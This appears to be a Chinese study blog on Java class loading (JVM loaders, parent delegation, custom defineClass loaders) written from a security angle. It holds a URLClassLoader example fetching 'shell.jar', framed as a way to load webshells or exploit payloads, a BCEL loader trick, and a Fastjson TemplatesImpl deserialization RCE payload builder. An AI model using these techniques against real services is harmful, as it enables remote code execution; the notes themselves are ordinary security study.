---
data: 2024-08-17
关联:
  - "[[Java开发]]"
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18364753
title: JAVA执行流程
---
# 基本流程
Java 程序的运行必须经过编写、编译和运行 3 个步骤：

1、编写：是指在 Java 开发环境中进行程序代码的输入，最终形成后缀名为 .java 的 Java 源文件。
2、编译：是指使用 Java 编译器对源文件进行错误排査的过程，编译后将生成后缀名为 .class 的字节码文件，不像C语言那样生成可执行文件。
3、运行：是指使用 Java 解释器将字节码文件翻译成机器代码，执行并显示结果。

![](https://cdn.nlark.com/yuque/0/2024/png/27874700/1722501220759-748c6596-ae13-4b6c-97cc-3fada58a6ca6.png)

Java 虚拟机（JVM）是运行 Java 程序的软件环境，Java 解释器是 Java 虚拟机的一部分。在运行 Java 程序时，首先会启动 JVM，然后由它来负责解释执行 Java 的字节码程序，并且 Java 字节码程序只能运行于 JVM 之上。这样利用 JVM 就可以把 Java 字节码程序和具体的硬件平台以及操作系统环境分隔开来，只要在不同的计算机上安装了针对特定平台的 JVM，Java 程序就可以运行，而不用考虑当前具体的硬件平台及操作系统环境，也不用考虑字节码文件是在何种平台上生成的。
# 类加载器
Java 的类加载器是一个重要的组件,负责在程序运行时动态加载 Java 类文件到 Java 虚拟机中。

java中有三种类加载器
- Bootstrap ClassLoader (引导类加载器) 该类加载器实现于JVM层，采用C++编写
- Extension ClassLoader (扩展类加载器)
- App ClassLoader (系统类加载器) 默认的类加载器

> BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。
>  
> 扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库.
>  
> App类加载器/系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。

## Java类加载方式
同时你可能会有疑问，为什么平时没有看到这些类的一个使用。其实我们一般情况下都是使用的隐式的一个类加载方式。
### 隐式加载
通过创建类的实例、访问类的静态成员、继承类或实现接口等方式隐式加载类。
```
// 创建类的实例
MyClass obj = new MyClass();

// 访问类的静态成员
int value = MyClass.staticField;

// 继承类
class SubClass extends MyClass { }

// 实现接口
class MyImplementation implements MyInterface { }
```
### 显示加载
#### ClassLoader类加载
##### Class.forName加载
通过 Class.forName() 方法显式加载类。这种方式会触发类的初始化过程。
```
String className = "com.example.MyClass";
Class<?> clazz = Class.forName(className);

this.getClass().getClassLoader().loadClass(className);
```
如果不希望初始化类可以使用Class.forName("类名", 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法。
defineClass方法通常被自定义的类加载器重写，用于将字节数组转换为Class对象,这对于动态加载类或者加载非标准的类文件格式非常有用。

如下展示了如何使用自定义的类加载器和defineClass方法来定义类:
详细加载流程
1. 我们使用loadClass方法进行加载后，会使用findLoadedClass来检查类是否加载过，如果已经被jvm加载过来，就直接会返回类的对象。
2. 如果加载失败就会调用自身的findclass。同时注意如果没有重写了findClass方法，那么直接返回类加载失败异常。
3. loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false。
##### 自定义加载器(直接利用defineClass)
其中defineClass方法通常被自定义的类加载器重写，用于将字节数组转换为Class对象,这对于动态加载类或者加载非标准的类文件格式非常有用。

```
public class ClassLoaderStudy extends ClassLoader {
    private static final String testClassName = "top.longlone.Hello";
   
    private static final byte[] testClassBytes = Base64.getDecoder().decode("yv66vgAAADQAHAoACAARBwASCgACABEIABMKAAIAFAoAAgAVBwAWBwAXAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABWhlbGxvAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAZIZWxsbyAMABgAGQwAGgAbAQASdG9wL2xvbmdsb25lL0hlbGxvAQAQamF2YS9sYW5nL09iamVjdAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAADAAEADQAOAAEACwAAACwAAgACAAAAFLsAAlm3AAMSBLYABSu2AAW2AAawAAAAAQAMAAAABgABAAAABQABAA8AAAACABA=");

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name.equals(testClassName)) {
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }
        return super.findClass(name);
    }

    public static void main(String[] args) throws Exception {
        ClassLoaderStudy loader = new ClassLoaderStudy();
        Class testClass = loader.loadClass(testClassName);
        Object o = testClass.newInstance();
        Method sayHello = o.getClass().getMethod("hello", String.class);
        String longlone = (String) sayHello.invoke(o, "Longlone");
        System.out.println(longlone);

    }
}
```

我们要继承ClassLoader类和覆盖findClass()方法.其中最核心的逻辑是defineClass方法
```
protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
```

- String name： 这是类的全限定名。在类加载器的作用下，该类将会被加载到Java虚拟机中。
- byte b： 这是一个字节数组，包含了一个类的字节码。这个字节数组通常是通过读取一个类文件（以 .class 结尾的文件）获得的。字节码数组应该包含有效的Java类文件的内容。
- int off：这是字节数组 b 中的起始偏移量，表示开始转换的位置。
- int len： 这是要转换的字节数，表示从偏移量 off 处开始的连续字节的长度。
#### URLClassLoader类
##### 快速概览 
RLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。注意这里使用JAR包,如果使用class文件,必须本地存在对应的类才行.
```java
import java.net.URL;
import java.net.URLClassLoader;

public class RemoteClassLoaderExample {

    public static void main(String[] args) {
        try {
            // 远程 class 文件的 URL
            URL remoteUrl = new URL("http://127.0.0.1:8086/shell.jar");

            // 创建 URL 数组
            URL[] urls = new URL[]{remoteUrl};

            // 创建 URLClassLoader 对象
            URLClassLoader classLoader = new URLClassLoader(urls);

            // 加载远程类
            Class<?> remoteClass = classLoader.loadClass("Test2");
            Object instance = remoteClass.getDeclaredConstructor().newInstance();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1708938815728-9760af7b-1ba7-4e13-81d6-d4173e319ace.png#averageHue=%2323252b&clientId=u1907886b-bade-4&from=paste&height=487&id=u9d5071dc&originHeight=536&originWidth=2152&originalType=binary&ratio=1.100000023841858&rotation=0&showTitle=false&size=172963&status=done&style=none&taskId=u7aeed246-1c3c-4aff-b1dc-a7750b4160e&title=&width=1956.3635939605974)
#### 漏洞实例
C3P0中的URLClassLoader类攻击


#### BCEL ClassLoader
BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理
```
package MemoryShell.BCEL;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;


public class BCELDemo {
    public static void main(String[] args) throws Exception {

         JavaClass cls = Repository.lookupClass(calc.class);
         String code = Utility.encode(cls.getBytes(), true);
         System.out.println(code);

         new ClassLoader().loadClass("$$BCEL$$" + code).newInstance();
    }
}
```
####   Xalan ClassLoader类
这里其实就是使用Xalan的自定义的defineClass来实现类加载
这里借用大佬的代码
https://www.javasec.org/javase/ClassLoader/
```
package com.anbai.sec.classloader;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Properties;

import static org.apache.commons.codec.binary.Base64.encodeBase64String;

public class XalanTemplatesImpl {

    /**
     * com.anbai.sec.classloader.TestAbstractTranslet类字节码
     */
    public static final byte[] CLASS_BYTES = new byte[]{
            -54, -2, -70, -66 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/XalanTemplatesImpl.java
    };

    /**
     * 使用反射修改TemplatesImpl类的成员变量方式触发命令执行，Jackson和Fastjson采用这种方式触发RCE
     *
     * @throws Exception 调用异常
     */
    public static void invokeField() throws Exception {
        TemplatesImpl template      = new TemplatesImpl();
        Class<?>      templateClass = template.getClass();

        // 获取需要修改的成员变量
        Field byteCodesField        = templateClass.getDeclaredField("_bytecodes");
        Field nameField             = templateClass.getDeclaredField("_name");
        Field tFactoryField         = templateClass.getDeclaredField("_tfactory");
        Field outputPropertiesField = templateClass.getDeclaredField("_outputProperties");

        // 修改成员属性访问权限
        byteCodesField.setAccessible(true);
        nameField.setAccessible(true);
        tFactoryField.setAccessible(true);
        outputPropertiesField.setAccessible(true);

        // 设置类字节码
        byteCodesField.set(template, new byte[][]{CLASS_BYTES});

        // 设置名称
        nameField.set(template, "");

        // 设置TransformerFactoryImpl实例
        tFactoryField.set(template, new TransformerFactoryImpl());

        // 设置Properties配置
        outputPropertiesField.set(template, new Properties());

        // 触发defineClass调用链：
        //   getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses->defineClass
        // 触发命令执行调用链：
        //   getOutputProperties->newTransformer->getTransletInstance->new TestAbstractTranslet->Runtime#exec
        template.getOutputProperties();
    }

    /**
     * 使用反射调用TemplatesImpl类的私有构造方法方式触发命令执行
     *
     * @throws Exception 调用异常
     */
    public static void invokeConstructor() throws Exception {
        // 获取TemplatesImpl构造方法
        Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
                byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
        );

        // 修改访问权限
        constructor.setAccessible(true);

        // 创建TemplatesImpl实例
        TemplatesImpl template = constructor.newInstance(
                new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
        );

        template.getOutputProperties();
    }

    /**
     * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
     */
    public static void fastjsonRCE() {
        // 构建恶意的JSON
        Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
        dataMap.put("@type", TemplatesImpl.class.getName());
        dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
        dataMap.put("_name", "");
        dataMap.put("_tfactory", new Object());
        dataMap.put("_outputProperties", new Object());

        // 生成Payload
        String json = JSON.toJSONString(dataMap);
        System.out.println(json);

        // 使用FastJson反序列化，但必须启用SupportNonPublicField特性
        JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
    }

    public static void main(String[] args) throws Exception {
//      invokeField();
//      invokeConstructor();
        fastjsonRCE();
    }

}

```
## 自定义类加载器
除开上文提到的三种加载器,我们还可以自定义加载器.
```
public class ClassLoaderStudy extends ClassLoader {
    private static final String testClassName = "top.longlone.Hello";
   
    private static final byte[] testClassBytes = Base64.getDecoder().decode("yv66vgAAADQAHAoACAARBwASCgACABEIABMKAAIAFAoAAgAVBwAWBwAXAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABWhlbGxvAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAZIZWxsbyAMABgAGQwAGgAbAQASdG9wL2xvbmdsb25lL0hlbGxvAQAQamF2YS9sYW5nL09iamVjdAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAADAAEADQAOAAEACwAAACwAAgACAAAAFLsAAlm3AAMSBLYABSu2AAW2AAawAAAAAQAMAAAABgABAAAABQABAA8AAAACABA=");

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name.equals(testClassName)) {
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }
        return super.findClass(name);
    }

    public static void main(String[] args) throws Exception {
        ClassLoaderStudy loader = new ClassLoaderStudy();
        Class testClass = loader.loadClass(testClassName);
        Object o = testClass.newInstance();
        Method sayHello = o.getClass().getMethod("hello", String.class);
        String longlone = (String) sayHello.invoke(o, "Longlone");
        System.out.println(longlone);

    }
}
```

我们要继承ClassLoader类和覆盖findClass()方法.其中最核心的逻辑是defineClass方法
```
protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
```

> 1. `String name`： 这是类的全限定名。在类加载器的作用下，该类将会被加载到Java虚拟机中。
> 2. `byte[] b`： 这是一个字节数组，包含了一个类的字节码。这个字节数组通常是通过读取一个类文件（以 .class 结尾的文件）获得的。字节码数组应该包含有效的Java类文件的内容。
> 3. `int off`：这是字节数组 `b` 中的起始偏移量，表示开始转换的位置。
> 4. `int len`： 这是要转换的字节数，表示从偏移量 `off` 处开始的连续字节的长度。
# Java类加载隔离
创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系）。
假设我们有两个应用程序 App1 和 App2，它们都使用了一个名为 MyClass 的类。我们来看看如何使用不同的类加载器来隔离这两个应用程序:

```
// App1.java
public class App1 {
    public static void main(String[] args) {
        MyClass obj = new MyClass();
        obj.doSomething();
    }
}

// App2.java
public class App2 {
    public static void main(String[] args) {
        MyClass obj = new MyClass();
        obj.doSomething();
    }
}

// MyClass.java
public class MyClass {
    public void doSomething() {
        System.out.println("MyClass doing something...");
    }
}
```
如果我们使用同一个类加载器加载这两个应用程序,那么它们将共享同一个 MyClass 实例,如果其中一个应用程序修改了 MyClass，另一个应用程序也会受到影响。

为了隔离这两个应用程序,我们可以使用不同的类加载器来加载它们:
```
// App1Loader.java
public class App1Loader extends ClassLoader {
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name.equals("MyClass")) {
            byte[] classBytes = loadClassBytes("MyClass");
            return defineClass(name, classBytes, 0, classBytes.length);
        }
        return super.findClass(name);
    }

    private byte[] loadClassBytes(String name) {
        // 从文件或其他地方加载 MyClass 的字节码
        // ...
    }
}

// App2Loader.java
public class App2Loader extends ClassLoader {
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name.equals("MyClass")) {
            byte[] classBytes = loadClassBytes("MyClass");
            return defineClass(name, classBytes, 0, classBytes.length);
        }
        return super.findClass(name);
    }

    private byte[] loadClassBytes(String name) {
        // 从文件或其他地方加载 MyClass 的字节码
        // ...
    }
}

// App1.java
public class App1 {
    public static void main(String[] args) {
        ClassLoader loader = new App1Loader();
        Class<?> clazz = loader.loadClass("MyClass");
        Object obj = clazz.newInstance();
        // 调用 MyClass 的方法
    }
}

// App2.java
public class App2 {
    public static void main(String[] args) {
        ClassLoader loader = new App2Loader();
        Class<?> clazz = loader.loadClass("MyClass");
        Object obj = clazz.newInstance();
        // 调用 MyClass 的方法
    }
```



## 双亲委派机制
简单来说就是类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用。


![](https://img2023.cnblogs.com/blog/3290837/202311/3290837-20231110215026626-519718966.png#id=M7XkT&originHeight=773&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

我们可以看到我们自定义的类是在最下面的,所以我们是无法更改java内部的三个加载器所负责的类.

因为第一个进行加载动作的其实是最顶层的引导类加载器，那么引导类加载器去寻找的目录的java类优先级就是最高的。即使有同名的java类，也不会影响java系统运行。
## 类加载方式
1. 命令行启动应用时候由JVM初始化加载
2. 通过Class.forName()方法动态加载
3. 通过ClassLoader.loadClass()方法动态加载

他们的区别是

- Class.forName(): 将类的.class文件加载到jvm中之外，还会对类进行解释，执行类中的static块；
- ClassLoader.loadClass(): 只干一件事情，就是将.class文件加载到jvm中，不会执行static中的内容,只有在newInstance才会去执行static块。
- Class.forName(name, initialize, loader)带参函数也可控制是否加载static块。并且只有调用了newInstance()方法采用调用构造函数，创建类的对象.
```java
public class loaderTest {
    public static void main(String[] args) throws ClassNotFoundException {
        ClassLoader loader = loaderTest.class.getClassLoader();
        System.out.println(loader);
        //使用ClassLoader.loadClass()来加载类，不会执行初始化块
        System.out.println("使用ClassLoader.loadClass()\n--------------");
        loader.loadClass("Test2");
        //使用Class.forName()来加载类，默认会执行初始化块
        System.out.println("使用Class.forName()\n--------------");
        Class.forName("Test2");
        //使用Class.forName()来加载类，并指定ClassLoader，初始化时不执行静态块
        System.out.println("使用Class.forName()\n--------------");
        Class.forName("Test2", false, loader);
    }
}
```
## 自定义加载器
主要就是继承ClassLoader类,我们自己的一个逻辑书写在findClass方法中

```java
public class ClassLoaderStudy extends ClassLoader {
    private static final String testClassName = "Test2";
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] data=loadClassData(name);
            if (data != null) {
                return defineClass(testClassName, data, 0, data.length);
            }
        return super.findClass(name);
    }
    private byte[] loadClassData(String className) {
        String fileName = File.separatorChar
                + className.replace('.', File.separatorChar) + ".class";
        try {
            System.out.println(fileName);
            InputStream ins = new FileInputStream(fileName);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int bufferSize = 1024;
            byte[] buffer = new byte[bufferSize];
            int length = 0;
            while ((length = ins.read(buffer)) != -1) {
                baos.write(buffer, 0, length);
            }
            byte[] byteArray = baos.toByteArray();
            Base64.Decoder base64Decoder = Base64.getDecoder();
            // 对字节数组进行Base64解码
            byte[] decodedData = base64Decoder.decode(byteArray);
            // 进行Base64解码
            return decodedData;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    public static void main(String[] args) throws Exception {
        ClassLoaderStudy loader = new ClassLoaderStudy();
        Class testClass = loader.loadClass("home/kali/桌面/test");
        Object o = testClass.newInstance();
    }
}
```


